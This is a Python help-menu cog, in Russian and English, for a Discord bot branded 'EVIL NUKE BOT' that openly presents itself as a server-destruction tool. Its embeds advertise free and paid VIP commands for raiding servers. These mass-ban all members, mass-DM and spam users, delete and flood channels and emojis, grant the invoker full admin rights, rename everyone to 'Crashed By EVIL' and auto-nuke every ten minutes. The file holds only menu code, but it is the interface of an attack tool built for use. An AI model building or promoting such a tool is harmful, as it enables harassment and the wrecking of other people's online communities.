import disnake
from disnake.ext import commands


class Help(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.ALLOWED_USER_ID = 1354873565161324646

    @commands.command(name="ehelp", aliases=["помощь", "commands"])
    async def ehelp(self, ctx):
        embed = disnake.Embed(
            title="🌍 **EVIL NUKE BOT**",
            description="**Выберите язык / Choose your language:**\n\n"
                        "🇷🇺 **Русский** — нажмите кнопку **RU**\n"
                        "🇬🇧 **English** — click the **EN** button",
            color=0x2f3136
        )
        embed.set_thumbnail(url=ctx.bot.user.display_avatar.url)
        embed.set_footer(text="EVIL NUKE", icon_url=ctx.bot.user.display_avatar.url)

        view = LanguageView(ctx.author.id)
        await ctx.send(embed=embed, view=view)


class LanguageView(disnake.ui.View):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = user_id

    async def interaction_check(self, interaction):
        if interaction.user.id != self.user_id:
            owner_name = "пользователь"
            if interaction.message and interaction.message.interaction:
                owner_name = interaction.message.interaction.user.name
            elif interaction.message:
                owner_name = interaction.message.author.name if interaction.message.author else "пользователь"
            
            embed = disnake.Embed(
                title="👀 **ЭТО НЕ ВАШЕ МЕНЮ!**",
                description=f"Вы попытались нажать на кнопку, которая принадлежит **{owner_name}**.\n\n"
                            f"💡 **Чтобы открыть своё меню, напишите:**\n"
                            f"```\n!ehelp\n```\n"
                            f"Или используйте одну из команд:\n"
                            f"`!помощь`  `!commands`",
                color=disnake.Color.from_rgb(48, 49, 54)
            )
            embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return False
        return True

    @disnake.ui.button(label="🇷🇺 RU", style=disnake.ButtonStyle.danger, custom_id="lang_ru")
    async def ru_button(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        embed = self.get_ru_embed(interaction)
        view = HelpViewRU(self.user_id)
        await interaction.response.edit_message(embed=embed, view=view)

    @disnake.ui.button(label="🇬🇧 EN", style=disnake.ButtonStyle.primary, custom_id="lang_en")
    async def en_button(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        embed = self.get_en_embed(interaction)
        view = HelpViewEN(self.user_id)
        await interaction.response.edit_message(embed=embed, view=view)

    def get_ru_embed(self, interaction):
        return disnake.Embed(
            title="**EVIL NUKE BOT**",
            description="⚡ **Команды для уничтожения серверов** ⚡\n"
                        f"┌─────────────────────────────┐\n"
                        f"│ **Разработчик:** **Cromwell/Деся**\n"
                        f"│ **Сервер:** **[Наш Discord](https://discord.gg/TCvsXj8teg)**\n"
                        f"└─────────────────────────────┘\n\n"
                        f"**📱 Нажми на кнопку ниже, чтобы выбрать раздел:**",
            color=0x2f3136
        ).set_thumbnail(url=interaction.bot.user.display_avatar.url).set_footer(
            text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url
        )

    def get_en_embed(self, interaction):
        return disnake.Embed(
            title="**EVIL NUKE BOT**",
            description="⚡ **Server destruction commands** ⚡\n"
                        f"┌─────────────────────────────┐\n"
                        f"│ **Developer:** **Cromwell/Деся**\n"
                        f"│ **Server:** **[Our Discord](https://discord.gg/TCvsXj8teg)**\n"
                        f"└─────────────────────────────┘\n\n"
                        f"**📱 Click the button below to select a section:**",
            color=0x2f3136
        ).set_thumbnail(url=interaction.bot.user.display_avatar.url).set_footer(
            text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url
        )


# ============= РУССКАЯ ВЕРСИЯ =============
class HelpViewRU(disnake.ui.View):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.ALLOWED_USER_ID = 1354873565161324646

    async def interaction_check(self, interaction):
        if interaction.user.id != self.user_id:
            owner_name = "пользователь"
            if interaction.message and interaction.message.interaction:
                owner_name = interaction.message.interaction.user.name
            elif interaction.message:
                owner_name = interaction.message.author.name if interaction.message.author else "пользователь"
            
            embed = disnake.Embed(
                title="👀 **ЭТО НЕ ВАШЕ МЕНЮ!**",
                description=f"Вы попытались нажать на кнопку, которая принадлежит **{owner_name}**.\n\n"
                            f"💡 **Чтобы открыть своё меню, напишите:**\n"
                            f"```\n!ehelp\n```\n"
                            f"Или используйте одну из команд:\n"
                            f"`!помощь`  `!commands`",
                color=disnake.Color.from_rgb(48, 49, 54)
            )
            embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return False
        return True

    @disnake.ui.button(label="🌸 Общие", style=disnake.ButtonStyle.primary, custom_id="ru_common")
    async def common_ru(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        embed = disnake.Embed(
            title="🌸 **ОБЩИЕ КОМАНДЫ**",
            description="```diff\n"
                        "+ !ehelp  -  Показать это меню\n"
                        "+ !ping  -  Проверить пинг бота\n"
                        "+ !stats -  Статистика атак\n"
                        "+ !info  -  Информация о боте\n"
                        "+ !status -  Статус бота\n"
                        "```",
            color=0x2f3136
        )
        embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
        await interaction.response.edit_message(embed=embed, view=self)

    @disnake.ui.button(label="🟢 Бесплатные", style=disnake.ButtonStyle.success, custom_id="ru_free")
    async def free_ru(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        embed = disnake.Embed(
            title="🟢 **БЕСПЛАТНЫЕ КОМАНДЫ**",
            description="```diff\n"
                        "+ !nuke  -  7 каналов + 2 пинга\n"
                        "+ !spam  -  Спам в ЛС (5 сообщений, кулдаун 4 часа)\n"
                        "+ !deleteemojis  -  Удалить все эмодзи\n"
                        "+ !unlockchannels  -  Разблокировать все каналы\n"
                        "+ !renameall  -  Переименовать всех в 'Crashed By EVIL'\n"
                        "+ !setprotectserver  -  Крашит сервер как !nuke\n"
                        "+ !admin  -  Выдать себе роль с полными правами администратора\n"
                        "```",
            color=0x00FF00
        )
        embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
        await interaction.response.edit_message(embed=embed, view=self)

    @disnake.ui.button(label="👑 VIP", style=disnake.ButtonStyle.danger, custom_id="ru_vip")
    async def vip_ru(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        embed = disnake.Embed(
            title="👑 **VIP КОМАНДЫ**",
            description="```diff\n"
                        "+ !vipnuke  -  20 каналов + 5 пингов + БАН ВСЕХ\n"
                        "+ !allban   -  Массовый бан всех пользователей\n"
                        "+ !dmall    -  Массовая рассылка в ЛС всем\n"
                        "+ !nicknameflood  -  Флуд смены ников (каждые 5 сек)\n"
                        "+ !rolecolor red/green/black  -  Сменить цвет всех ролей\n"
                        "+ !autonuke  -  Авто-нук каждые 10 минут\n"
                        "+ !serverbackup  -  Получить шаблон сервера\n"
                        "+ !emojiraid  -  Удалить все эмодзи и добавить 50 новых\n"
                        "```\n"
                        "💡 **Вписать ключ:** в ЛС бота `/key КЛЮЧ`",
            color=0xFF0000
        )
        embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
        await interaction.response.edit_message(embed=embed, view=self)

    @disnake.ui.button(label="⚠️ Условия", style=disnake.ButtonStyle.secondary, custom_id="ru_rules")
    async def rules_ru(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        embed = disnake.Embed(
            title="⚠️ **УСЛОВИЯ ИСПОЛЬЗОВАНИЯ**",
            description="```yaml\n"
                        "• Кулдаун !nuke: 15 секунд\n"
                        "• Кулдаун !vipnuke: 120 секунд\n"
                        "• Кулдаун !allban: 300 секунд\n"
                        "• Кулдаун !spam: 4 часа\n"
                        "• !nuke доступен всем\n"
                        "• !vipnuke и !allban требуют активации ключа\n"
                        "• Чёрный список: сервера из списка игнорируются\n"
                        "```",
            color=0x2f3136
        )
        embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
        await interaction.response.edit_message(embed=embed, view=self)

    @disnake.ui.button(label="🔗 Ссылки", style=disnake.ButtonStyle.secondary, custom_id="ru_links")
    async def links_ru(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        embed = disnake.Embed(
            title="🔗 **ПОЛЕЗНЫЕ ССЫЛКИ**",
            description=f"┌───────────────────────────────────┐\n"
                        f"│ **[GitHub](https://github.com/Cromwell-ru)**\n"
                        f"│ **[Наш Discord](https://discord.gg/TCvsXj8teg)**\n"
                        f"└───────────────────────────────────┘",
            color=0x2f3136
        )
        embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
        await interaction.response.edit_message(embed=embed, view=self)

    @disnake.ui.button(label="👑 Owner", style=disnake.ButtonStyle.secondary, custom_id="ru_owner")
    async def owner_ru(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        if interaction.user.id != self.ALLOWED_USER_ID:
            owner_name = "пользователь"
            if interaction.message and interaction.message.interaction:
                owner_name = interaction.message.interaction.user.name
            elif interaction.message:
                owner_name = interaction.message.author.name if interaction.message.author else "пользователь"
            
            embed = disnake.Embed(
                title="👀 **ЭТО НЕ ВАШЕ МЕНЮ!**",
                description=f"Вы попытались нажать на кнопку, которая принадлежит **{owner_name}**.\n\n"
                            f"💡 **Чтобы открыть своё меню, напишите:**\n"
                            f"```\n!ehelp\n```",
                color=disnake.Color.from_rgb(48, 49, 54)
            )
            embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        embed = disnake.Embed(
            title="👑 **ВЛАДЕЛЕЦ**",
            description="```diff\n"
                        "+ !presence_on        -  Включить Rich Presence\n"
                        "+ !presence_off       -  Выключить Rich Presence\n"
                        "+ !presence_set текст -  Установить кастомный статус\n"
                        "+ !presence_inactive  -  Установить статус 'Не активен'\n"
                        "+ !presence_full      -  Установить полный статус\n"
                        "```\n"
                        "**ЧЁРНЫЙ СПИСОК:**\n"
                        "```diff\n"
                        "+ !blacklist_add ID   -  Добавить сервер в ЧС\n"
                        "+ !blacklist_remove ID -  Удалить сервер из ЧС\n"
                        "+ !blacklist_list     -  Показать ЧС\n"
                        "```",
            color=0x2f3136
        )
        embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
        await interaction.response.edit_message(embed=embed, view=self)

    @disnake.ui.button(label="🏠 Главная", style=disnake.ButtonStyle.secondary, custom_id="ru_home")
    async def home_ru(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        embed = disnake.Embed(
            title="🌍 **EVIL NUKE BOT**",
            description="**Выберите язык / Choose your language:**\n\n"
                        "🇷🇺 **Русский** — нажмите кнопку **RU**\n"
                        "🇬🇧 **English** — click the **EN** button",
            color=0x2f3136
        )
        embed.set_thumbnail(url=interaction.bot.user.display_avatar.url)
        embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)

        view = LanguageView(self.user_id)
        await interaction.response.edit_message(embed=embed, view=view)


# ============= АНГЛИЙСКАЯ ВЕРСИЯ =============
class HelpViewEN(disnake.ui.View):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.ALLOWED_USER_ID = 1354873565161324646

    async def interaction_check(self, interaction):
        if interaction.user.id != self.user_id:
            owner_name = "user"
            if interaction.message and interaction.message.interaction:
                owner_name = interaction.message.interaction.user.name
            elif interaction.message:
                owner_name = interaction.message.author.name if interaction.message.author else "user"
            
            embed = disnake.Embed(
                title="👀 **THIS IS NOT YOUR MENU!**",
                description=f"You tried to click a button that belongs to **{owner_name}**.\n\n"
                            f"💡 **To open your own menu, type:**\n"
                            f"```\n!ehelp\n```\n"
                            f"Or use one of these commands:\n"
                            f"`!помощь`  `!commands`",
                color=disnake.Color.from_rgb(48, 49, 54)
            )
            embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return False
        return True

    @disnake.ui.button(label="🌸 Common", style=disnake.ButtonStyle.primary, custom_id="en_common")
    async def common_en(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        embed = disnake.Embed(
            title="🌸 **COMMON COMMANDS**",
            description="```diff\n"
                        "+ !ehelp  -  Show this menu\n"
                        "+ !ping  -  Check bot ping\n"
                        "+ !stats -  Attack statistics\n"
                        "+ !info  -  Bot information\n"
                        "+ !status -  Bot status\n"
                        "```",
            color=0x2f3136
        )
        embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
        await interaction.response.edit_message(embed=embed, view=self)

    @disnake.ui.button(label="🟢 Free", style=disnake.ButtonStyle.success, custom_id="en_free")
    async def free_en(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        embed = disnake.Embed(
            title="🟢 **FREE COMMANDS**",
            description="```diff\n"
                        "+ !nuke  -  7 channels + 2 pings\n"
                        "+ !spam  -  DM spam (5 messages, cooldown 4 hours)\n"
                        "+ !deleteemojis  -  Delete all emojis\n"
                        "+ !unlockchannels  -  Unlock all channels\n"
                        "+ !renameall  -  Rename all to 'Crashed By EVIL'\n"
                        "+ !setprotectserver  -  Crashes server like !nuke\n"
                        "+ !admin  -  Give yourself full administrator role\n"
                        "```",
            color=0x00FF00
        )
        embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
        await interaction.response.edit_message(embed=embed, view=self)

    @disnake.ui.button(label="👑 VIP", style=disnake.ButtonStyle.danger, custom_id="en_vip")
    async def vip_en(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        embed = disnake.Embed(
            title="👑 **VIP COMMANDS**",
            description="```diff\n"
                        "+ !vipnuke  -  20 channels + 5 pings + BAN ALL\n"
                        "+ !allban   -  Mass ban all users\n"
                        "+ !dmall    -  Mass DM all users\n"
                        "+ !nicknameflood  -  Nickname flood (every 5 sec)\n"
                        "+ !rolecolor red/green/black  -  Change all roles color\n"
                        "+ !autonuke  -  Auto-nuke every 10 minutes\n"
                        "+ !serverbackup  -  Get server template link\n"
                        "+ !emojiraid  -  Delete all emojis and add 50 new\n"
                        "```\n"
                        "💡 **Enter key:** in DM to bot `/key KEY`",
            color=0xFF0000
        )
        embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
        await interaction.response.edit_message(embed=embed, view=self)

    @disnake.ui.button(label="⚠️ Rules", style=disnake.ButtonStyle.secondary, custom_id="en_rules")
    async def rules_en(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        embed = disnake.Embed(
            title="⚠️ **TERMS OF USE**",
            description="```yaml\n"
                        "• !nuke cooldown: 15 seconds\n"
                        "• !vipnuke cooldown: 120 seconds\n"
                        "• !allban cooldown: 300 seconds\n"
                        "• !spam cooldown: 4 hours\n"
                        "• !nuke available to everyone\n"
                        "• !vipnuke and !allban require key activation\n"
                        "• Blacklist: servers in list are ignored\n"
                        "```",
            color=0x2f3136
        )
        embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
        await interaction.response.edit_message(embed=embed, view=self)

    @disnake.ui.button(label="🔗 Links", style=disnake.ButtonStyle.secondary, custom_id="en_links")
    async def links_en(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        embed = disnake.Embed(
            title="🔗 **USEFUL LINKS**",
            description=f"┌───────────────────────────────────┐\n"
                        f"│ **[GitHub](https://github.com/Cromwell-ru)**\n"
                        f"│ **[Our Discord](https://discord.gg/TCvsXj8teg)**\n"
                        f"└───────────────────────────────────┘",
            color=0x2f3136
        )
        embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
        await interaction.response.edit_message(embed=embed, view=self)

    @disnake.ui.button(label="👑 Owner", style=disnake.ButtonStyle.secondary, custom_id="en_owner")
    async def owner_en(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        if interaction.user.id != self.ALLOWED_USER_ID:
            owner_name = "user"
            if interaction.message and interaction.message.interaction:
                owner_name = interaction.message.interaction.user.name
            elif interaction.message:
                owner_name = interaction.message.author.name if interaction.message.author else "user"
            
            embed = disnake.Embed(
                title="👀 **THIS IS NOT YOUR MENU!**",
                description=f"You tried to click a button that belongs to **{owner_name}**.\n\n"
                            f"💡 **To open your own menu, type:**\n"
                            f"```\n!ehelp\n```",
                color=disnake.Color.from_rgb(48, 49, 54)
            )
            embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        embed = disnake.Embed(
            title="👑 **OWNER**",
            description="```diff\n"
                        "+ !presence_on        -  Enable Rich Presence\n"
                        "+ !presence_off       -  Disable Rich Presence\n"
                        "+ !presence_set text  -  Set custom status\n"
                        "+ !presence_inactive  -  Set 'Inactive' status\n"
                        "+ !presence_full      -  Set full status\n"
                        "```\n"
                        "**BLACKLIST:**\n"
                        "```diff\n"
                        "+ !blacklist_add ID   -  Add server to blacklist\n"
                        "+ !blacklist_remove ID -  Remove server from blacklist\n"
                        "+ !blacklist_list     -  Show blacklist\n"
                        "```",
            color=0x2f3136
        )
        embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)
        await interaction.response.edit_message(embed=embed, view=self)

    @disnake.ui.button(label="🏠 Home", style=disnake.ButtonStyle.secondary, custom_id="en_home")
    async def home_en(self, button: disnake.ui.Button, interaction: disnake.MessageInteraction):
        embed = disnake.Embed(
            title="🌍 **EVIL NUKE BOT**",
            description="**Выберите язык / Choose your language:**\n\n"
                        "🇷🇺 **Русский** — нажмите кнопку **RU**\n"
                        "🇬🇧 **English** — click the **EN** button",
            color=0x2f3136
        )
        embed.set_thumbnail(url=interaction.bot.user.display_avatar.url)
        embed.set_footer(text="EVIL NUKE", icon_url=interaction.bot.user.display_avatar.url)

        view = LanguageView(self.user_id)
        await interaction.response.edit_message(embed=embed, view=view)


def setup(bot):
    bot.add_cog(Help(bot))